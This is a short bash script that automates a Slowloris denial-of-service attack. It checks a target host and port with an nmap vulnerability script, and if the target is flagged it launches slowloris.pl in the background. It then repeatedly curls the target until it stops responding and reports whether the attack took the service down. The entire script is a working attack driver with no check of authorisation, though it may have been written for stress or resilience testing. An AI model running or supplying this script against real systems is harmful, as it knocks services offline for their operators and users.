if [ "$PORT" == '' ]; then
  echo 'Port not set. defaulting to 80'
  PORT=80
fi

echo "REPORT: Checking if $TARGET:$PORT is vulnerable to Slowloris"
nmap --script http-slowloris-check $TARGET | grep 'VULNERABLE' &> /dev/null;
if [ $? == 0 ]; then
   echo "REPORT: $TARGET:$PORT is vulnerable to Slowloris. Executing attack"
   (perl slowloris.pl -dns $TARGET -port $PORT)&
   slowloris_pid=$!

   COUNTER=1
   FAIL=1

   echo "Testing if $TARGET:$PORT is up"
   while [ $COUNTER -lt 7 ]; do
     STATUS=`curl $TARGET:$PORT -k -f -o /dev/null && echo "SUCCESS" || echo "ERROR"`
     echo $STATUS
     if [ $STATUS == "SUCCESS" ]; then
       echo "$TARGET:$PORT is up. Trying iteration: $COUNTER"
       sleep 10
     else
       echo "REPORT: Slowloris succeeded on $TARGET:$PORT"
       kill $slowloris_pid
       FAIL=0
       COUNTER=7
     fi

     let COUNTER=COUNTER+1
   done

   if [ $FAIL == 1 ]; then
     echo "REPORT: Slowloris attack on $TARGET did not succeed"
     kill $slowloris_pid
   fi
else
  echo "REPORT: $TARGET:$PORT is not vulnerable to Slowloris attack"
fi

exec "$@"
